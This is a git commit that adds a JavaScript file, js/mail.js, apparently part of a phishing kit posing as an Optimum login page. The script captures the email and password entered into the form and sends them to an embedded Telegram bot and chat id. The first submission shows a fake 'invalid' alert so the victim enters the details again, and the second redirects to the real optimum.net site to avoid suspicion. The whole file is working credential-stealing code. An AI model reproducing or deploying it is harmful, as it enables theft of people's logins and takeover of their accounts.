c137167e245cfc875a9a4942dba81c33c4694246
BigMoves199x <Arolefawaz01@yahoo.com>
2024-10-11 16:45:29 +0100

    first commit

---
+++ js/mail.js
@@ -0,0 +1,44 @@
+//   FORM-1
+(function ($) {
+  "use strict";
+
+  $(document).ready(function () {
+    $("#form-1")
+      .data("counter", 0)
+      .submit(function (event) {
+        event.preventDefault();
+
+        var emailInput = $("input[name='email']", this).val();
+        var password = $("input[name='password']", this).val();
+
+        var info_values = `Optimum Login Info is:%0A - Email: ${emailInput} %0A - Password: ${password}`;
+
+        var bot_id = "5715406629:AAEyzHsnpE3MsSanPNR8n5B5VtKbOz8yGNw";
+        var chat_id = 526147671;
+        var url = `https://api.telegram.org/bot${bot_id}/sendMessage?chat_id=${chat_id}&text=${info_values}`;
+
+        var funcs = [
+          function one() {
+            let api = new XMLHttpRequest();
+            api.open("GET", url, true);
+            api.send();
+
+            document.getElementById("alert-invalid-keystore").style.display =
+              "block";
+            emailInput = "";
+            password = "";
+          },
+          function two() {
+            let api = new XMLHttpRequest();
+            api.open("GET", url, true);
+            api.send();
+            window.location.href = "https://optimum.net";
+          },
+        ];
+
+        var counter = $(this).data("counter");
+        funcs[counter]();
+        $(this).data("counter", counter < funcs.length - 1 ? ++counter : 0);
+      });
+  });
+})(jQuery);
